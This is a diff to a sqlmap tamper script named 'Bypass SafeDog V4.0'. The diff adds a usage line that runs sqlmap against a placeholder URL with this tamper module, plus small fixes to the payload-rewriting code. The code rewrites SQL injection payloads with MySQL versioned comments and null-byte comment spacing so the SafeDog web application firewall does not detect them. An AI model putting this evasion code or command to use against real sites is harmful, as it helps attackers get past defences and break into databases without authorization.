@@ -3,9 +3,11 @@
 """
 Bypass SafeDog V4.0
 Version: 1.0
+Date: 2018-04-18
 Author: Kyrie403
 Copyright (c) Kyrie403
 GitHub: https://github.com/kyrie403
+Usage: python sqlmap.py -u http://test.com/test.php?id=1 --tamper=bypasssafedogv4 --random-agent --delay=0.5 --dbms MYSQL 
 
 """
 
@@ -45,11 +47,11 @@ def tamper(payload, **kwargs):
             if key in retVal:
                 pattern_func = r'{}\(\w*\)'.format(key)
                 pattern_value = r'(?<={}\()\w*(?=\))'.format(key)
-                value = re.findall(pattern_value, retVal)
                 func = re.findall(pattern_func, retVal)
+                value = re.findall(pattern_value, retVal)
                 try:
                     retVal = retVal.replace(func[0], "(/*!{key}/**/*//**/({value}))").format(key=key, value=value[0])
-                except Exception:
+                except IndexError:
                     pass
         retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", lambda match: process(match), retVal)
         retVal = retVal.replace(" ", "/*%00*/").replace("%20", "/*%00*/")
